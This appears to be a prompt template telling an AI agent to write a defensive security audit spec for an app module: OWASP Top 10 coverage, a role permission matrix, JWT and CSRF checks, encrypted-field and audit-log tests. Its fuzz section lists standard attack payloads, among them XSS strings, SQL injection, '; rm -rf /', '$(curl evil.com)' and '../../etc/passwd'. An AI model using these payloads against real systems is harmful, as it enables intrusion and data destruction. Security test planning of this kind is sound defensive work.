You are producing a **security audit specification** for the {MODULE_NAME}
module. This is the OWASP, hardening, permission-matrix, encrypted-field
layer of our spec pack — the things a motivated attacker would probe
that no E2E / integration / perf spec directly surfaces.

═══════════════════════════════════════════════════════════════════════════
WHERE THIS SITS IN THE SPEC PACK
═══════════════════════════════════════════════════════════════════════════

| Command             | Covers                                                                      |
| ------------------- | --------------------------------------------------------------------------- |
| /E2E                | UI-visible behaviour per role                                               |
| /e2e-integration    | RLS, webhooks, API contracts, DB invariants, concurrency                    |
| /e2e-worker-test    | BullMQ, cron, async chains                                                  |
| /e2e-perf           | Latency budgets, load, scale                                                |
| /e2e-security-audit | **This command** — OWASP Top 10 for the module, hardening, attack scenarios |
| /e2e-full           | Runs all five                                                               |

Mindset: you are a paid adversarial security consultant. You are NOT here
to confirm the module is secure. You are here to find the attack that
hasn't been considered yet, and to write a test row that will fail if
the defence is ever regressed.

═══════════════════════════════════════════════════════════════════════════
HARD RULES — NON-NEGOTIABLE
═══════════════════════════════════════════════════════════════════════════

1. OWASP TOP 10 PER MODULE. Walk the latest OWASP Top 10 and for
   each category, write either:
   - A concrete attack scenario against this module with expected
     defensive behaviour, OR
   - A "Not applicable" row with the specific reason (e.g. "this
     module has no file upload endpoints, so A03 SSRF via file
     references is N/A")
     No category may be silently skipped. Current list (A01–A10):
   - A01 Broken Access Control — per-role per-endpoint tests
   - A02 Cryptographic Failures — encrypted field round-trips,
     TLS enforcement, secret storage
   - A03 Injection — SQL / NoSQL / command / LDAP / template via
     every user-controlled input field
   - A04 Insecure Design — threat-model review of state machines,
     business logic abuse (e.g. negative refund amounts, decimal
     overflow attacks on currency)
   - A05 Security Misconfiguration — CSP / HSTS / X-Frame-Options
     / Referrer-Policy / Permissions-Policy headers; verbose error
     exposure; debug endpoints
   - A06 Vulnerable Components — dependency audit for packages the
     module uses
   - A07 Identification & Authentication Failures — JWT expiry,
     refresh-rotation, session fixation, MFA bypass
   - A08 Software & Data Integrity — webhook signature verification,
     audit log tamper resistance, package-integrity
   - A09 Logging & Monitoring — sensitive data in logs, missing
     audit events, alerting coverage
   - A10 SSRF — user-supplied URLs, image proxying, PDF link
     resolution

2. PERMISSION MATRIX — EVERY ENDPOINT × EVERY ROLE. Construct a grid
   where each cell is a specific test:
   - Rows: every authenticated endpoint in the module
   - Columns: every role in the system (admin, school_principal,
     school_owner, front_office, accounting, teacher, parent,
     student, unauthenticated, cross-tenant admin)
   - Cell = expected HTTP status + exact error code
     For this module, most cells will be either "200" (allowed),
     "403 FORBIDDEN" (authenticated but wrong role), "401
     UNAUTHORIZED" (no token), or "404" (cross-tenant). The matrix
     must be exhaustive — a single missing cell is a permission hole
     waiting to surface in prod.

3. INPUT INJECTION FUZZ. For every user-controlled field in every
   endpoint (names, descriptions, notes, search queries, filters,
   UUIDs, dates, numbers), write test rows for at least these
   payloads:
   - XSS: `<script>alert(1)</script>`, `"><img src=x onerror=alert(1)>`,
     `javascript:alert(1)`, polyglot SVG
   - SQL injection: `'; DROP TABLE --`, `' OR '1'='1`, `' UNION SELECT`
   - NoSQL injection (if applicable): `{"$ne": null}`, `{"$gt": ""}`
   - Command injection (if any endpoint shells out): `; rm -rf /`,
     `$(curl evil.com)`
   - Path traversal (if any endpoint reads files): `../../etc/passwd`,
     `%2e%2e%2f`
   - Unicode / encoding attacks: `%00` null byte, homoglyph
     characters, overlong UTF-8
   - Oversize payloads: 1MB+ strings, deeply nested JSON (stack
     overflow via recursion), zip bombs (for any upload endpoint)
   - Type confusion: send string where number expected, array where
     scalar expected, null where required, undefined where optional
     Expected defensive behaviour per row:
   - Input validated at Zod → 400 with specific code
   - Output sanitised / escaped when re-rendered (React handles this
     by default but verify no `dangerouslySetInnerHTML` paths)
   - Persisted payload echoed back is safely rendered (no DOM XSS
     when an XSS string is saved then viewed)

4. AUTHENTICATION HARDENING. For every flow that uses JWT / session:
   - Expired JWT → 401 with appropriate code, no work done
   - Forged JWT (signed with wrong key) → 401, no leaked info
   - JWT with tampered payload (changed `sub` or `tenant_id`) →
     verification fails
   - JWT replay across tenants — same JWT tried against a different
     tenant subdomain → rejected
   - Refresh token rotation — old refresh token becomes invalid
     after use (detects stolen refresh tokens)
   - Concurrent sessions — revoking one session should not
     invalidate another unless that's the explicit product behaviour
   - Brute-force rate limiting on login — N failed attempts lock
     the account or add exponential backoff

5. CSRF PROTECTION. For every state-mutating endpoint:
   - Request without CSRF token → 403 (if CSRF middleware is
     configured)
   - Request with token but from a different origin (no
     cors-allowed origin) → blocked
   - Request with token from allowed origin but stale → rejected
     If the stack uses Bearer tokens + CORS as CSRF defence, the spec
     must verify the CORS policy is tight — only the expected
     frontend origin can issue credentialed requests.

6. ENCRYPTED FIELDS. For every column marked as encrypted in the
   Prisma schema (or documented in the security spec):
   - Written via the encryption service → stored as ciphertext in
     the DB (verify via raw SQL `SELECT column FROM table`)
   - Read via the decryption service → plaintext returned
   - Read via raw SELECT → ciphertext only, never plaintext
   - Returned in API responses → masked form (last 4 digits for
     cards, bank details, etc.) — never full plaintext in the
     response body
   - Audit-logged on every decrypt — verify an `audit_log` row
     exists per decrypt
   - Never written to application logs — grep the log stream for
     the plaintext, must not appear
   - Never appears in error messages or stack traces

7. AUDIT LOG INTEGRITY. For every mutation the module allows:
   - Audit row exists after the mutation
   - Row contains: actor user id, tenant id, entity type, entity
     id, action, before payload, after payload, timestamp, request
     id
   - Row is not editable via any exposed endpoint (tamper
     resistance)
   - Row is not deletable via any exposed endpoint (retention
     guarantee)
   - Sensitive fields in before/after are redacted (e.g. full card
     numbers, raw passwords, decrypted secrets) — only safe
     representations are persisted

8. SENSITIVE DATA IN RESPONSES / LOGS. For every response shape:
   - Does it include full unmasked PII that the requester doesn't
     need? (e.g. returning a parent's unredacted phone number on
     an unrelated invoice list)
   - Does it leak internal IDs that could be enumerated? (e.g.
     sequential integer IDs without a UUID wrapper)
   - Does it include stack traces or DB error messages in 5xx
     responses?
     For every log line (API, worker, error logs):
   - Does it include JWT tokens, session cookies, Stripe keys,
     unencrypted passwords, bank details? (Any match = P0 finding.)

9. RATE LIMITING. For every public or semi-public endpoint:
   - N requests per minute from one IP → 429 after the threshold
   - Specific sensitive endpoints (login, password reset, webhook,
     PDF render) need tighter limits — verify each per-endpoint
     budget
   - Cross-tenant abuse: one tenant flooding requests should not
     degrade service for another tenant

10. SECURITY HEADERS. For every HTML response and every API
    response:
    - `Content-Security-Policy` — no unsafe-inline scripts, no
      `*` in script-src, nonce-based inline where necessary
    - `Strict-Transport-Security` — present with max-age ≥ 1 year
    - `X-Frame-Options: DENY` or `CSP frame-ancestors 'none'`
    - `X-Content-Type-Options: nosniff`
    - `Referrer-Policy: strict-origin-when-cross-origin` or tighter
    - `Permissions-Policy` — explicit allowlist for camera,
      geolocation, payment, etc.
      Header presence is an exact-string assertion, not a vibe check.

11. DEPENDENCY AUDIT. Run `pnpm audit` (or equivalent) for the
    module's workspace:
    - Zero critical CVEs
    - No high-severity CVEs without a mitigation note
    - Lockfile committed and pinned
    - No packages depending on deprecated single-maintainer
      sub-trees (flag for review)

12. BUSINESS LOGIC ABUSE. Every state machine + every numeric input
    gets an abuse row:
    - Negative amounts on refunds, discounts, payments — rejected
    - Integer overflow via very large numbers — rejected or
      clamped safely
    - Decimal precision attacks (0.005 rounded up to 0.01 etc.) —
      accumulated over N transactions, balance stays correct
    - Race condition attacks (double-submit same refund,
      double-spend same credit note) — exactly one succeeds, not
      two
    - Status skipping (try to transition `draft → paid` directly
      without going through `issued`) — rejected
    - Negative sequence numbers / duplicate sequence numbers
      impossible by construction

13. FORMAT. Four-column table with a severity column added:
    | # | What to attempt | Expected defence (status + behaviour) | Severity | Pass/Fail |
    Severity uses P0 (critical — immediate exploit), P1 (high), P2
    (medium), P3 (low / informational). Numbered rows, TOC,
    sign-off. Identical conventions to the other specs.

═══════════════════════════════════════════════════════════════════════════
PROCESS
═══════════════════════════════════════════════════════════════════════════

Step 1 — Survey:

- Every controller route in the module + its guard stack
- Every Zod schema feeding those routes (injection surface)
- Every encrypted field in the Prisma schema
- `docs/architecture/danger-zones.md` for known module-specific
  traps
- The central auth module (JWT signing, refresh rotation, CSRF
  config, CORS config)
- The middleware chain applied to the module's routes
- The permission registry for the module's permissions

Step 2 — Map. Produce:

- OWASP-Top-10 × module matrix (10 cells, some may be N/A)
- Permission matrix (endpoints × roles)
- Injection surface inventory (fields × payload classes)
- Encrypted-field inventory
- Response-shape inventory for sensitive-data leakage review

Step 3 — Outline. Suggested section layout:

1. Threat model summary (who's the attacker, what do they want,
   what's the blast radius if they succeed)
2. OWASP Top 10 walkthrough per category
3. Permission matrix
4. Input injection fuzz
5. Authentication hardening
6. CSRF + CORS
7. Encrypted field access control
8. Audit log integrity
9. Sensitive data exposure review (responses + logs)
10. Rate limiting
11. Security headers
12. Dependency audit
13. Business logic abuse
14. Summary severity tally + sign-off

Step 4 — Write. Each row names the exact attack payload + the exact
defensive response. For P0 and P1 findings, include a short
exploitation note that explains what an attacker gains if the
defence fails (helps reviewers understand severity).

Step 5 — Self-review. Walk the OWASP Top 10 again — any category
without a concrete row or an explicit N/A justification = gap.
Walk the permission matrix — any missing cell = gap. Walk the
encrypted-field list — any column without a full round-trip test
= gap.

Step 6 — Coverage tracker. Update the security-audit entry
alongside the other legs.

═══════════════════════════════════════════════════════════════════════════
DELIVERABLES
═══════════════════════════════════════════════════════════════════════════

Save the file to:
{FOLDER_PATH}/security/{module-slug}-security-spec.md

Update:
E2E/COVERAGE-TRACKER.md

At the end, report:

- OWASP categories covered (should be 10/10)
- Permission matrix cell count
- Injection-fuzz row count
- Encrypted-field round-trip test count
- Security-header row count
- Any discovered findings in the CODE during the walkthrough — do
  NOT fix silently. Report as P0/P1/P2/P3 with file:line, and the
  user decides which to fix before the spec is handed to a tester.
- A severity tally: P0 / P1 / P2 / P3 count

═══════════════════════════════════════════════════════════════════════════
ANTI-PATTERNS TO AVOID
═══════════════════════════════════════════════════════════════════════════

- Do NOT write "is the endpoint secure?" Write a specific attack
  payload and the specific expected defence
- Do NOT skip N/A justifications. "SSRF is not applicable because
  the module has no user-supplied URL inputs" is a legitimate row.
  Silently omitting a category is not.
- Do NOT assume rate limiting works because middleware is
  configured. Test it with actual rapid-fire requests and verify
  429 fires at the documented threshold.
- Do NOT accept "we use Bearer tokens so CSRF is not a concern"
  as a pass. Verify the CORS policy is tight and test the attack
  anyway — a one-line CORS regression later breaks this assumption.
- Do NOT skip business logic abuse. The most damaging exploits
  against finance modules are not SQLi — they're "what if I refund
  a negative amount" or "what if I race two allocations on the
  same payment".
- Do NOT silently fix findings you discover during the audit. The
  user needs to see the full list and decide what ships this week
  vs next week vs goes to the backlog.
- Do NOT write rows an auditor can argue about. Every row has an
  exact payload, an exact expected status code, and an exact
  post-condition.

═══════════════════════════════════════════════════════════════════════════
WHEN IN DOUBT
═══════════════════════════════════════════════════════════════════════════

The bar for this spec is: if every row passes, a paid professional
security consultant (the kind that charges $10k for a week of
their time) would find nothing new to tell you about the module.
That's the ambition. If the spec feels less thorough than that, go
back and make it more thorough.

Begin with Step 1. At the end, confirm deliverables and report the
severity tally.
